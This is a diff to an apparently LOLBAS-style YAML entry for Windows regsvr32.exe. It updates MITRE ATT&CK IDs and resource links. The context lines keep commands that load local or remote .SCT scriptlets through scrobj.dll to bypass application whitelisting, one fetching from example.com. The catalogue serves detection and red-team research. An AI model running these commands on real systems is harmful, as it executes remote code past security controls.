@@ -9,32 +9,28 @@ Commands:
     Usecase: Execute code from remote scriptlet, bypass Application whitelisting
     Category: AWL bypass
     Privileges: User
-    MitreID: T1117
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1117
+    MitreID: T1218.010
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: regsvr32.exe /s /u /i:file.sct scrobj.dll
     Description: Execute the specified local .SCT script with scrobj.dll.
     Usecase: Execute code from scriptlet, bypass Application whitelisting
     Category: AWL bypass
     Privileges: User
-    MitreID: T1117
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1117
+    MitreID: T1218.010
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
     Description: Execute the specified remote .SCT script with scrobj.dll.
     Usecase: Execute code from remote scriptlet, bypass Application whitelisting
     Category: Execute
     Privileges: User
-    MitreID: T1117
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1117
+    MitreID: T1218.010
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: regsvr32.exe /s /u /i:file.sct scrobj.dll
     Description: Execute the specified local .SCT script with scrobj.dll.
     Usecase: Execute code from scriptlet, bypass Application whitelisting
     Category: Execute
     Privileges: User
-    MitreID: T1117
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1117
+    MitreID: T1218.010
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 Full_Path:
   - Path: C:\Windows\System32\regsvr32.exe
@@ -47,7 +43,7 @@ Detection:
 Resources:
   - Link: https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/
   - Link: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
-  - Link: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md
+  - Link: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md
 Acknowledgement:
   - Person: Casey Smith
     Handle: '@subtee'
